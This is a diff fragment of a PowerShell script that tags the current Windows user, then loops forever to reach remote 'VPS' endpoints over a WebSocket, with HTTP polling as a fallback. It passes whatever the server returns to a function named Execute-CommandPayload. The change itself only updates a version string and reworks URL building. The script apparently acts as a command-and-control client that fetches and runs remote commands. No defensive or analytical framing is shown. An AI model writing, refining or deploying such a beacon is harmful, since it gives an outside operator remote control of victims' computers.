@@ -27,7 +27,7 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
-$SCRIPT_VERSION = "e038283"
+$SCRIPT_VERSION = "3c83405"
 $clientVersion = $SCRIPT_VERSION
 
 function Execute-CommandPayload ($r) {
@@ -72,12 +72,14 @@ function Execute-CommandPayload ($r) {
 try {
   while ($true) {
     try {
-      $wsUri = "$VPS_WS_URL?username=" + [System.Uri]::EscapeDataString($uniqueUser) + "&version=" + [System.Uri]::EscapeDataString($clientVersion)
+      $safeUser = [System.Uri]::EscapeDataString([string]$uniqueUser)
+      $safeVer = [System.Uri]::EscapeDataString([string]$clientVersion)
+      $wsUri = "$VPS_WS_URL?username=$safeUser&version=$safeVer"
       $ws = New-Object System.Net.WebSockets.ClientWebSocket
       $cts = New-Object System.Threading.CancellationTokenSource
       $cts.CancelAfter(10000)
 
-      $ws.ConnectAsync((New-Object System.Uri($wsUri)), $cts.Token).Wait()
+      $ws.ConnectAsync([System.Uri]::new($wsUri), $cts.Token).Wait()
 
       if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
         $buffer = [System.ArraySegment[byte]]::new((New-Object byte[] 8192))
@@ -132,8 +134,10 @@ try {
       Add-Content -Path $logFile -Value $errText -ErrorAction SilentlyContinue
 
       try {
-        $u = $VPS_POLL_URL + "?username=" + [System.Uri]::EscapeDataString($uniqueUser) + "&version=" + [System.Uri]::EscapeDataString($clientVersion)
-        $r = Invoke-RestMethod -Method Get -Uri (New-Object System.Uri($u)) -TimeoutSec 5
+        $safeUser = [System.Uri]::EscapeDataString([string]$uniqueUser)
+        $safeVer = [System.Uri]::EscapeDataString([string]$clientVersion)
+        $u = "$VPS_POLL_URL?username=$safeUser&version=$safeVer"
+        $r = Invoke-RestMethod -Method Get -Uri $u -TimeoutSec 5
         Execute-CommandPayload $r
       }
       catch {
